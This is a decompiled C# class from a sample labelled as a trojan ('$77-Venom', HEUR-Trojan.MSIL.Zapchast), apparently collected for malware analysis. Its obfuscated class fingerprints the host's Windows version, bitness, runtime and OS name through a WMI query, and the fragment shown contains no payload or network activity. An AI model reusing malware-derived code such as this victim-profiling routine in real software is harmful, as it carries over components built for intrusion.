// Decompiled with JetBrains decompiler
// Type: 㴾뭦暼뜨┾ᡛ憪捃㒋瓐飙�ﲈﾝ］啦
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using System;
using System.Management;
using System.Text.RegularExpressions;

public static class 㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦
{
  static 㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦()
  {
    㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Win32NT = Environment.OSVersion.Platform == PlatformID.Win32NT;
    㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.XpOrHigher = 㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Win32NT && Environment.OSVersion.Version.Major >= 5;
    㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.VistaOrHigher = 㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Win32NT && Environment.OSVersion.Version.Major >= 6;
    㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.SevenOrHigher = 㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Win32NT && Environment.OSVersion.Version >= new Version(6, 1);
    㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.EightOrHigher = 㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Win32NT && Environment.OSVersion.Version >= new Version(6, 2, 9200);
    㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.EightPointOneOrHigher = 㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Win32NT && Environment.OSVersion.Version >= new Version(6, 3);
    㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.TenOrHigher = 㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Win32NT && Environment.OSVersion.Version >= new Version(10, 0);
    㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.RunningOnMono = Type.GetType("Mono.Runtime") != (Type) null;
    㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Name = "Unknown OS";
    using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem"))
    {
      using (ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator())
      {
        if (enumerator.MoveNext())
          㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Name = enumerator.Current["Caption"].ToString();
      }
    }
    㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Name = Regex.Replace(㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Name, "^.*(?=Windows)", "").TrimEnd().TrimStart();
    㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Is64Bit = Environment.Is64BitOperatingSystem;
    㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.FullName = string.Format("{0} {1} Bit", (object) 㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Name, (object) (㴾뭦暼\uF62F뜨\u253Eᡛ憪\uF337捃㒋瓐\uEB59\uE4E1飙\uFFFDﲈﾝ\uFF3D啦.Is64Bit ? 64 : 32));
  }

  public static string FullName { get; private set; }

  public static string Name { get; private set; }

  public static bool Is64Bit { get; private set; }

  public static bool RunningOnMono { get; private set; }

  public static bool Win32NT { get; private set; }

  public static bool XpOrHigher { get; private set; }

  public static bool VistaOrHigher { get; private set; }

  public static bool SevenOrHigher { get; private set; }

  public static bool EightOrHigher { get; private set; }

  public static bool EightPointOneOrHigher { get; private set; }

  public static bool TenOrHigher { get; private set; }
}
